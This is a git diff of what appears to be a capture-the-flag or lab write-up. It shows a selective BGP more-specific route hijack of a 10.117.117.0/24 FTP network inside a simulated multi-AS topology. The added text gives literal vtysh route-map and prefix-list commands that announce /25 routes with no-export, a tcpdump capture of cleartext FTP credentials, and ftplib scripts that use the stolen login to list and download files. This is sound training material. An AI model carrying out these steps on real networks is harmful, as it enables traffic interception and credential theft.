@@ -432,8 +432,6 @@ Two protections are used:
 
 Without these controls, R3 could learn a more-specific route to its own FTP network and forward matching traffic away from the real server. The result could be a routing loop or a black hole.
 
----
-
 The support ticket identifies a protected FTP **subnet**, but not a
 password. Record the subnet exactly:
 
@@ -473,6 +471,16 @@ while the client AS also has a shorter direct path to that server AS.
 
 ## 8. Phase 6 - Build the selective more-specific hijack
 
+So, there's a user on AS65508 (Vindhya Broadband) connecting to a server on the 10.117.117.0/24 network (the server is 10.117.117.10, which we will be identifying further and is the IP address of the br-f085181eb522 interface on the host OS). We can't initially see his traffic because the traffic is sent directly from AS65508 to AS64655 (Sahyadri Data Exchange) (we are on AS64592).
+
+The idea is to inject more specific routes for the 10.117.117.0/24 network so the router of Vindhya Broadband (R2) will send traffic to us at r1 (DakshinLink Router). Then once we get the traffic we'll send it back out towards Sahyadri's Router because we already have a BGP route from Sahyadri Router (R3) for the 10.117.117.0/24 network.
+
+There's a small twist to this: when we send the more specific route (we can use a /25 or anything smaller than a /24), we must ensure that this route is not sent from r2 to r3 otherwise r3 will blackhole traffic towards the router since it received a more specific route. To do this, we can add the no-export BGP community to the route sent to r2, so the route won't be re-advertised to other systems.
+
+We can see below that the best route for the 10.117.117.0/24 network is from AS64655 (10.187.52.35).
+
+<img width="1185" height="712" alt="image" src="https://github.com/user-attachments/assets/52db6914-bf1b-4d35-a994-77c39265efb4" />
+
 Split the discovered FTP `/24` into two `/25` networks:
 
 ```bash
@@ -485,45 +493,42 @@ PY
 )
 printf 'PREFIX_A=%s\nPREFIX_B=%s\n' "$PREFIX_A" "$PREFIX_B"
 ```
+<img width="859" height="374" alt="image" src="https://github.com/user-attachments/assets/2010d774-d0e7-4985-bfbd-b51c8585e8ee" />
 
-Apply the route policy from the router shell:
-
-```bash
-vtysh \
-  -c "configure terminal" \
-  -c "ip prefix-list HIJACK seq 5 permit $PREFIX_A" \
-  -c "ip prefix-list HIJACK seq 10 permit $PREFIX_B" \
-  -c "route-map TO-AS2 permit 10" \
-  -c "match ip address prefix-list HIJACK" \
-  -c "set community no-export" \
-  -c "route-map TO-AS2 permit 20" \
-  -c "route-map TO-AS3 deny 10" \
-  -c "match ip address prefix-list HIJACK" \
-  -c "route-map TO-AS3 permit 20" \
-  -c "router bgp $LOCAL_AS" \
-  -c "network $PREFIX_A" \
-  -c "network $PREFIX_B" \
-  -c "end" \
-  -c "clear bgp $CLIENT_PEER soft out"
-```
-
-Why both controls matter:
-
-- `no-export` tells the client AS not to re-advertise the more-specifics.
-- `TO-AS3 deny 10` prevents DakshinLink from sending the hijack routes to
-  the server AS.
-
-Without those controls, the server AS can install the more-specific route
-back toward the attacker and create a loop or black hole.
-
-Confirm the live advertisement:
+Apply the route policy from the router shell, We'll change the route-map to add no-export to routes sent to AS65508, then advertise the 10.117.117.0/24 network::
 
 ```bash
-vtysh -c "show bgp ipv4 unicast neighbors $CLIENT_PEER advertised-routes"
-vtysh -c "show bgp ipv4 unicast neighbors $SERVER_PEER advertised-routes"
+vtysh
+configure terminal
+ip prefix-list HIJACK seq 5 permit 10.117.117.0/25
+ip prefix-list HIJACK seq 10 permit 10.117.117.128/25
+route-map TO-AS2 permit 10
+match ip address prefix-list HIJACK
+set community no-export
+route-map TO-AS2 permit 20
+route-map TO-AS3 deny 10
+match ip address prefix-list HIJACK
+route-map TO-AS3 permit 20
+router bgp 64592
+network 10.117.117.0/25
+network 10.117.117.128/25
+end
 ```
+<img width="762" height="653" alt="image" src="https://github.com/user-attachments/assets/80759150-7750-457a-8a19-a2b20fcb79a3" />
 
-The two `/25` routes must be visible toward the client peer and absent
+After changing the route-map, we can issue a *clear bgp 10.195.138.251 soft out* command to refresh the outbound filter policies without resetting the entire BGP adjacency. We can now see that we are advertising the /25 route towards AS65508:
+
+```bash
+clear bgp 10.195.138.251 soft out
+
+show bgp ipv4 unicast neighbors 10.195.138.251 advertised-routes"
+show bgp ipv4 unicast neighbors 10.187.52.35 advertised-routes"
+```
+<img width="784" height="382" alt="image" src="https://github.com/user-attachments/assets/1c09dde9-15a6-4ef8-81fd-ed6febf66366" />
+
+<img width="821" height="665" alt="image" src="https://github.com/user-attachments/assets/982ed564-364d-4278-b18c-9eb0c66f634e" />
+
+Note: The two `/25` routes must be visible toward the client peer and absent
 toward the server peer.
 
 ## 9. Phase 7 - Intercept the real FTP authentication
@@ -534,6 +539,8 @@ Capture only real FTP control traffic for the discovered network:
 ```bash
 tcpdump -ni any -A "dst net $FTP_SUBNET and tcp dst port 21"
 ```
+<img width="1469" height="855" alt="image" src="https://github.com/user-attachments/assets/c0753eb5-2b44-4889-84cd-e970b4db1079" />
+
 
 Wait for the next scheduled transfer. Record the clear-text lines:
 
@@ -541,9 +548,9 @@ Wait for the next scheduled transfer. Record the clear-text lines:
 USER <live-user>
 PASS <live-password>
 ```
+<img width="1470" height="683" alt="image" src="https://github.com/user-attachments/assets/3181eaa5-5fd4-41cd-8928-f4ca198bd596" />
+<img width="1470" height="355" alt="image" src="https://github.com/user-attachments/assets/aed77942-14c9-40ad-9134-5745835977a1" />
 
-These values were generated during deployment and came from actual packets.
-Submit the exact raw value following `PASS`. Do not add a wrapper.
 
 Identify the FTP server address from the same packet capture, then confirm
 that the intercepted account is also valid for the protected host:
@@ -555,9 +562,10 @@ ssh "${FTP_USER}@${FTP_SERVER_IP}"
 cat archive/network-operations-archive.txt
 
 OR
+```
 
 List the FTP files:
-
+```bash
 python3 - <<'PY'
 from ftplib import FTP
 
@@ -574,8 +582,11 @@ with FTP() as ftp:
     print("[+] Available files:")
     ftp.retrlines("LIST")
 PY
+```
+<img width="762" height="695" alt="image" src="https://github.com/user-attachments/assets/688a06e1-d47b-4ef0-bfbf-31db983421cc" />
 
 After finding the filename, download it using:
+```bash
 python3 - "$FILE_NAME" <<'PY'
 from ftplib import FTP
 from pathlib import Path
@@ -598,9 +609,12 @@ with FTP() as ftp:
 print(f"[+] Downloaded: {local_name}")
 PY
 ```
+<img width="793" height="855" alt="image" src="https://github.com/user-attachments/assets/b6f45159-9fee-49d0-bccf-49fa784c5b0e" />
 
 This final access is performed from the compromised R1 router because the
 protected host is part of the hidden carrier topology.
+
+<img width="964" height="191" alt="image" src="https://github.com/user-attachments/assets/332a8c8e-c73c-462b-a93d-1e1e7933bf03" />
 
 ## 10. Evidence checklist
 
